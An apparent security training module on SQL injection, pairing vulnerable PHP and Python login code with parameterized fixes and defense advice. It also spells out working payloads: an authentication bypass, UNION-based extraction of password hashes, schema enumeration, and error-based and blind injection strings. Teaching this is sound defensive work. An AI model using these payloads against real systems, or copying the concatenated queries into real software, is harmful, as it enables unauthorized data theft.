Module 02 — SQL Injection

Why SQL Injection Exists

SQL injection occurs when user-supplied input is concatenated directly into a SQL query string instead of being passed as a parameterized value. The database engine cannot distinguish between code and data, so attacker-controlled input becomes part of the query logic.

Vulnerable Code: String Concatenation

// PHP — VULNERABLE
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password_hash='$password'";
$result = mysqli_query($conn, $query);
# Python — VULNERABLE
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password_hash='{password}'"
cursor.execute(query)

If an attacker submits ' OR '1'='1 as the username, the resulting query becomes: 

SELECT * FROM users WHERE username='' OR '1'='1' AND password_hash='anything'

Because '1'='1' is always true, the WHERE clause matches every row and authentication is bypassed.

Safe Code: Parameterized Queries

// PHP — SAFE (prepared statement)
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password_hash=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
# Python — SAFE (parameterized)
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password_hash=?",
    (username, password)
)
Root cause: The query is built by concatenating untrusted strings. Parameterized queries solve this by separating the SQL structure from the data values, making injection impossible.

UNION-Based SQL Injection

A UNION SELECT attack appends a second query to the original, letting the attacker read data from arbitrary tables. Two requirements must be met:

  1. The number of columns in the injected SELECT must match the original query.
  2. The data types of corresponding columns must be compatible (or NULL).

Step 1 — Discover the Column Count

Use the ORDER BY technique: increment the column index until an error occurs. The last successful index equals the number of columns. 

-- If the query has 4 columns:
' ORDER BY 1--    (OK)
' ORDER BY 2--    (OK)
' ORDER BY 3--    (OK)
' ORDER BY 4--    (OK)
' ORDER BY 5--    (ERROR — column 5 does not exist, so there are 4 columns)

Alternatively, use UNION SELECT NULL with increasing NULLs: 

' UNION SELECT NULL--              (error — wrong column count)
' UNION SELECT NULL,NULL--         (error)
' UNION SELECT NULL,NULL,NULL--    (error)
' UNION SELECT NULL,NULL,NULL,NULL--  (success — 4 columns!)

Step 2 — NULL Padding

Once you know the column count, use NULL as a placeholder for columns you do not need. NULLs are compatible with every data type: 

' UNION SELECT username, password_hash, NULL, NULL FROM users--

Step 3 — Extract Data

With the column count known, you can pull data from any table. Use group_concat() to merge multiple rows into a single value when only one output column is available: 

-- Single-column extraction trick
' UNION SELECT group_concat(username || ':' || password_hash, '<br>'), NULL, NULL, NULL FROM users--

Schema Enumeration (SQLite)

In SQLite, the sqlite_master table lists every table and its schema: 

-- List all table names
SELECT name FROM sqlite_master WHERE type='table';

-- Get the CREATE TABLE statement
SELECT sql FROM sqlite_master WHERE type='table' AND name='secret_table';

In other databases, equivalent catalog tables exist:

  • MySQL: information_schema.tables, information_schema.columns
  • PostgreSQL: information_schema.tables, pg_catalog.pg_tables
  • SQL Server: INFORMATION_SCHEMA.TABLES, sys.tables

Other SQL Injection Techniques

Error-Based Injection

When the application displays database error messages, an attacker can craft queries that deliberately cause errors containing data. For example, in MySQL: 

-- MySQL error-based extraction
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x
  FROM information_schema.tables GROUP BY x)a)--

Blind SQL Injection

When no data or errors are displayed, attackers infer information one bit at a time by observing application behavior differences (Boolean-based) or response timing (time-based): 

-- Boolean-based blind
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- Time-based blind (MySQL)
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
Blind injection is slow but powerful. Tools like sqlmap automate the process of extracting entire databases character by character.

Real-World Impact

SQL injection consistently ranks in the OWASP Top 10. Notable breaches include:

  • Heartland Payment Systems (2008): 130 million credit card numbers stolen via SQLi.
  • Sony Pictures (2011): Unparameterized queries led to full database exfiltration.
  • TalkTalk (2015): Personal details of 157,000 customers accessed through SQLi.
Defense in depth: Beyond parameterized queries, use least-privilege DB accounts, web application firewalls, input validation, and avoid exposing raw error messages to users.
